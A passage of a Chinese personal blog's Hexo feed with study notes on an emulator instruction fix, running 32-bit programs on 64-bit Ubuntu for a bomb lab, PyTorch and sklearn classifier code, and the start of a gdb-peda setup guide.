href="https://www.xianwaizhiyin.net/?p=1035" target="_blank" rel="noopener">X86汇编入门-寄存器32位 - 弦外之音</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PA答疑之a4指令码报错</title>
      <link href="/2022/05/27/PA%E7%AD%94%E7%96%91%E4%B9%8Ba4%E6%8C%87%E4%BB%A4%E7%A0%81%E6%8A%A5%E9%94%99/"/>
      <url>/2022/05/27/PA%E7%AD%94%E7%96%91%E4%B9%8Ba4%E6%8C%87%E4%BB%A4%E7%A0%81%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>PA3.1在运行/bin/bmptest时，遇到提示a4这条指令没有实现的情况：</p><img src="https://s2.loli.net/2022/05/27/yOt4KiAgJuleBNQ.png" width="500" height="400" alt="图片名称" align="center" id="202"><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-法1"><a class="markdownIt-Anchor" href="#21-法1"></a> 2.1 法1</h2><p>在 navy-apps/Makefile.compile 修改o2为o0即可，这是关闭了代码优化，避免了⼀些数据未保存。</p><p>在navy-apps里make clean后再重新编译。</p><h2 id="22-法2"><a class="markdownIt-Anchor" href="#22-法2"></a> 2.2 法2</h2><p>实现a4指令：（<code>胡宇轩学弟</code>提供）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">make_EHelper(movsb)&#123;</span><br><span class="line">  vaddr_write(cpu.edi,<span class="number">1</span>,vaddr_read(cpu.esi,<span class="number">1</span>));</span><br><span class="line">  t0 = <span class="number">1</span>;</span><br><span class="line">  rtl_add(&amp;cpu.edi,&amp;cpu.edi,&amp;t0);</span><br><span class="line">  rtl_add(&amp;cpu.esi,&amp;cpu.esi,&amp;t0);</span><br><span class="line">  print_asm(<span class="string">"movbx"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DF等于0是递增，等于1是递减，具体实现见386手册：</p><img src="https://s2.loli.net/2022/05/27/AimEsOoM9XalY8c.png" width="600" height="400" alt="图片名称" align="center" id="203">]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64位Ubuntu运行或调试32位程序</title>
      <link href="/2022/05/26/64%E4%BD%8DUbuntu%E8%BF%90%E8%A1%8C32%E4%BD%8D%E7%A8%8B%E5%BA%8F/"/>
      <url>/2022/05/26/64%E4%BD%8DUbuntu%E8%BF%90%E8%A1%8C32%E4%BD%8D%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>最近在做lab2，使用64位的Ubuntu发现无法调试和运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  lab ./bomb </span><br><span class="line">zsh: no such file or directory: ./bomb</span><br></pre></td></tr></table></figure><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>ubuntu 64位下可以兼容32位程序的运行，但是必须要有32位基础库的支持才行。下面进行安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386</span><br><span class="line">sudo apt install lib32z1</span><br></pre></td></tr></table></figure><p>安装完成后可以运行和调试了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  lab ./bomb </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  lab gdb ./bomb</span><br><span class="line">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">"show copying"</span> and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>...</span><br><span class="line">Reading symbols from ./bomb...</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/357653128" target="_blank" rel="noopener">ubuntu 64下运行32位程序</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MLP的pytorch实现</title>
      <link href="/2022/05/16/MLP%E7%9A%84pytorch%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/05/16/MLP%E7%9A%84pytorch%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>xxx</p><h1 id="2-实现"><a class="markdownIt-Anchor" href="#2-实现"></a> 2 实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_digits</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, precision_score, recall_score, f1_score, classification_report, confusion_matrix</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> label_binarize</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_curve, auc</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">0</span>)</span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">torch.cuda.manual_seed_all(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"加载数据"</span>)</span><br><span class="line">digits = load_digits()</span><br><span class="line">data, label = digits.data, digits.target</span><br><span class="line"><span class="comment"># print(data.shape, label.shape)</span></span><br><span class="line">train_data, test_data, train_label, test_label = train_test_split(data, label, test_size=<span class="number">.3</span>, random_state=<span class="number">123</span>)</span><br><span class="line">print(<span class="string">'训练数据：'</span>, train_data.shape)</span><br><span class="line">print(<span class="string">'测试数据：'</span>, test_data.shape)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"定义相关参数"</span>)</span><br><span class="line">epochs = <span class="number">30</span></span><br><span class="line">batch_size = train_data.shape[<span class="number">0</span>]</span><br><span class="line">device = torch.device(<span class="string">"cuda:0"</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">"cpu"</span>)</span><br><span class="line">input_dim = data.shape[<span class="number">1</span>]</span><br><span class="line">hidden_dim = <span class="number">256</span></span><br><span class="line">output_dim = len(set(label))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"构建数据集"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DigitsDataset</span><span class="params">(Dataset)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, input_data, input_label)</span>:</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(input_data, input_label):</span><br><span class="line">      data.append((i,j))</span><br><span class="line">    self.data = data</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> len(self.data)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">    d, l = self.data[index]</span><br><span class="line">    <span class="keyword">return</span> d, l</span><br><span class="line"></span><br><span class="line">trainDataset = DigitsDataset(train_data, train_label)</span><br><span class="line">testDataset = DigitsDataset(test_data, test_label)</span><br><span class="line"><span class="comment"># print(trainDataset[0])</span></span><br><span class="line"><span class="comment"># print(trainDataset[0])</span></span><br><span class="line">trainDataLoader = DataLoader(trainDataset, batch_size=batch_size, shuffle=<span class="literal">True</span>, num_workers=<span class="number">0</span>)  <span class="comment"># 2改为0</span></span><br><span class="line">testDataLoader = DataLoader(testDataset, batch_size=batch_size, shuffle=<span class="literal">False</span>, num_workers=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, input_dim, hidden_dim, output_dim)</span>:</span></span><br><span class="line">    super(Model, self).__init__()</span><br><span class="line">    self.fc1 = nn.Linear(input_dim, hidden_dim)</span><br><span class="line">    self.relu = nn.ReLU()</span><br><span class="line">    self.fc2 = nn.Linear(hidden_dim, output_dim)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">    x = self.fc1(x)</span><br><span class="line">    x = self.relu(x)</span><br><span class="line">    x = self.fc2(x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">model = Model(input_dim, hidden_dim, output_dim)</span><br><span class="line">print(model)</span><br><span class="line">model.to(device)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"定义损失函数、优化器"</span>)</span><br><span class="line">criterion = nn.CrossEntropyLoss()</span><br><span class="line">optimizer = torch.optim.SGD(model.parameters(), lr=<span class="number">0.01</span>, momentum=<span class="number">0.9</span>, weight_decay=<span class="number">1e-4</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"初始化相关参数"</span>)</span><br><span class="line"><span class="keyword">for</span> param <span class="keyword">in</span> model.parameters():</span><br><span class="line">  nn.init.normal_(param, mean=<span class="number">0</span>, std=<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"开始训练主循环"</span>)</span><br><span class="line">total_step = len(trainDataLoader)</span><br><span class="line"></span><br><span class="line">model.train()</span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(epochs):</span><br><span class="line">  tot_loss = <span class="number">0.0</span></span><br><span class="line">  tot_acc = <span class="number">0.0</span></span><br><span class="line">  train_preds = []</span><br><span class="line">  train_trues = []</span><br><span class="line">  <span class="comment"># model.train()</span></span><br><span class="line">  <span class="keyword">for</span> i,(train_data_batch, train_label_batch) <span class="keyword">in</span> enumerate(trainDataLoader):</span><br><span class="line">    train_data_batch = train_data_batch.float().to(device) <span class="comment"># 将double数据转换为float</span></span><br><span class="line">    train_label_batch = train_label_batch.to(device)</span><br><span class="line">    outputs = model(train_data_batch)</span><br><span class="line">    <span class="comment"># _, preds = torch.max(outputs.data, 1)</span></span><br><span class="line">    loss = criterion(outputs, train_label_batch.type(torch.LongTensor))</span><br><span class="line">    <span class="comment"># print(loss)</span></span><br><span class="line">    <span class="comment">#反向传播优化网络参数</span></span><br><span class="line">    loss.backward()</span><br><span class="line">    optimizer.step()</span><br><span class="line">    optimizer.zero_grad()</span><br><span class="line">    <span class="comment">#累加每个step的损失</span></span><br><span class="line">    tot_loss += loss.data</span><br><span class="line">    train_outputs = outputs.argmax(dim=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    train_preds.extend(train_outputs.detach().cpu().numpy())</span><br><span class="line">    train_trues.extend(train_label_batch.detach().cpu().numpy())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tot_acc += (outputs.argmax(dim=1) == train_label_batch).sum().item()</span></span><br><span class="line"></span><br><span class="line">  sklearn_accuracy = accuracy_score(train_trues, train_preds)</span><br><span class="line">  sklearn_precision = precision_score(train_trues, train_preds, average=<span class="string">'micro'</span>)</span><br><span class="line">  sklearn_recall = recall_score(train_trues, train_preds, average=<span class="string">'micro'</span>)</span><br><span class="line">  sklearn_f1 = f1_score(train_trues, train_preds, average=<span class="string">'micro'</span>)</span><br><span class="line">  print(<span class="string">"[sklearn_metrics] Epoch:&#123;&#125; loss:&#123;:.4f&#125; accuracy:&#123;:.4f&#125; precision:&#123;:.4f&#125; recall:&#123;:.4f&#125; f1:&#123;:.4f&#125;"</span>.format(epoch, tot_loss, sklearn_accuracy, sklearn_precision, sklearn_recall, sklearn_f1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_confusion_matrix</span><span class="params">(trues, preds)</span>:</span></span><br><span class="line">  labels = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">  conf_matrix = confusion_matrix(trues, preds, labels=labels)</span><br><span class="line">  <span class="keyword">return</span> conf_matrix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot_confusion_matrix</span><span class="params">(conf_matrix)</span>:</span></span><br><span class="line">  plt.imshow(conf_matrix, cmap=plt.cm.Greens)</span><br><span class="line">  indices = range(conf_matrix.shape[<span class="number">0</span>])</span><br><span class="line">  labels = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">  plt.xticks(indices, labels)</span><br><span class="line">  plt.yticks(indices, labels)</span><br><span class="line">  plt.colorbar()</span><br><span class="line">  plt.xlabel(<span class="string">'y_pred'</span>)</span><br><span class="line">  plt.ylabel(<span class="string">'y_true'</span>)</span><br><span class="line">  <span class="comment"># 显示数据</span></span><br><span class="line">  <span class="keyword">for</span> first_index <span class="keyword">in</span> range(conf_matrix.shape[<span class="number">0</span>]):</span><br><span class="line">    <span class="keyword">for</span> second_index <span class="keyword">in</span> range(conf_matrix.shape[<span class="number">1</span>]):</span><br><span class="line">      plt.text(first_index, second_index, conf_matrix[first_index, second_index])</span><br><span class="line">  plt.savefig(<span class="string">'heatmap_confusion_matrix.jpg'</span>)</span><br><span class="line">  plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_preds = []</span><br><span class="line">test_trues = []</span><br><span class="line">model.eval()</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">  <span class="keyword">for</span> i,(test_data_batch, test_data_label) <span class="keyword">in</span> enumerate(testDataLoader):</span><br><span class="line">    test_data_batch = test_data_batch.float().to(device) <span class="comment"># 将double数据转换为float</span></span><br><span class="line">    test_data_label = test_data_label.to(device)</span><br><span class="line">    test_outputs = model(test_data_batch)</span><br><span class="line">    test_outputs = test_outputs.argmax(dim=<span class="number">1</span>)</span><br><span class="line">    test_preds.extend(test_outputs.detach().cpu().numpy())</span><br><span class="line">    test_trues.extend(test_data_label.detach().cpu().numpy())</span><br><span class="line"></span><br><span class="line">  sklearn_precision = precision_score(test_trues, test_preds, average=<span class="string">'micro'</span>)</span><br><span class="line">  sklearn_recall = recall_score(test_trues, test_preds, average=<span class="string">'micro'</span>)</span><br><span class="line">  sklearn_f1 = f1_score(test_trues, test_preds, average=<span class="string">'micro'</span>)</span><br><span class="line">  print(classification_report(test_trues, test_preds))</span><br><span class="line">  conf_matrix = get_confusion_matrix(test_trues, test_preds)</span><br><span class="line">  print(conf_matrix)</span><br><span class="line">  plot_confusion_matrix(conf_matrix)</span><br><span class="line">  print(<span class="string">"[sklearn_metrics] accuracy:&#123;:.4f&#125; precision:&#123;:.4f&#125; recall:&#123;:.4f&#125; f1:&#123;:.4f&#125;"</span>.format(sklearn_accuracy, sklearn_precision, sklearn_recall, sklearn_f1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Press the green button in the gutter to run the script.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">'train-mlp'</span>)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print((end - start) / <span class="number">60</span>, <span class="string">"min"</span>)  <span class="comment"># 秒</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sklean常见机器学习分类器</title>
      <link href="/2022/05/16/sklean%E5%B8%B8%E8%A7%81%E5%88%86%E7%B1%BB%E5%99%A8/"/>
      <url>/2022/05/16/sklean%E5%B8%B8%E8%A7%81%E5%88%86%E7%B1%BB%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>使用python的机器学习库sklearn实现常见的机器学习分类算法，如决策树、随机森林等。</p><h1 id="2-代码实现"><a class="markdownIt-Anchor" href="#2-代码实现"></a> 2 代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rf_train</span><span class="params">()</span>:</span></span><br><span class="line">    api_train = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>]])</span><br><span class="line">    type_train = np.array([<span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    api_test = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]])</span><br><span class="line">    type_test = np.array([<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    clf = DecisionTreeClassifier(random_state=<span class="number">0</span>)</span><br><span class="line">    rfc = RandomForestClassifier(random_state=<span class="number">0</span>)</span><br><span class="line">    clf = clf.fit(api_train, type_train)</span><br><span class="line">    rfc = rfc.fit(api_train, type_train)</span><br><span class="line">    score_c = clf.score(api_test, type_test)</span><br><span class="line">    score_r = rfc.score(api_test, type_test)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Single Tree:&#123;&#125;"</span>.format(score_c), <span class="string">"Random Forest:&#123;&#125;"</span>.format(score_r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    print(<span class="string">'最终版-随机森林'</span>)</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    print((end - start) / <span class="number">60</span>, <span class="string">"min"</span>)  <span class="comment"># 秒</span></span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/weixin_41571493/article/details/83011147" target="_blank" rel="noopener">【机器学习】Sklearn 常用分类器（全）</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Lab2实验总结</title>
      <link href="/2022/05/15/Lab2%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
      <url>/2022/05/15/Lab2%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-准备"><a class="markdownIt-Anchor" href="#1-准备"></a> 1 准备</h1><h2 id="11-安装gdb-peda"><a class="markdownIt-Anchor" href="#11-安装gdb-peda"></a> 1.1 安装gdb-peda</h2><p>gdb-peda是gdb的插件，加强gdb调试能力。</p><p>安装方法如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor att$ git <span class="built_in">clone</span> htgdb-peda$ <span class="built_in">set</span> disassembly-flavor atttps://github.com/longld/peda.git ~/peda</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>安装插件后汇编指令格式改为了intel模式，不太习惯，改变为AT&amp;T格式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改为AT&amp;T格式</span></span><br><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor att</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改为Intel格式</span></span><br><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor intel</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://blog.csdn.net/counsellor/article/details/81290335" target="_blank" rel="noopener">gdb-peda安装</a></p><h2 id="12-gdbpeda使用"><a class="markdownIt-Anchor" href="#12-gdbpeda使用"></a> 1.2 gdb&amp;peda使用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 载入可执行程序</span></span><br><span class="line">gdb 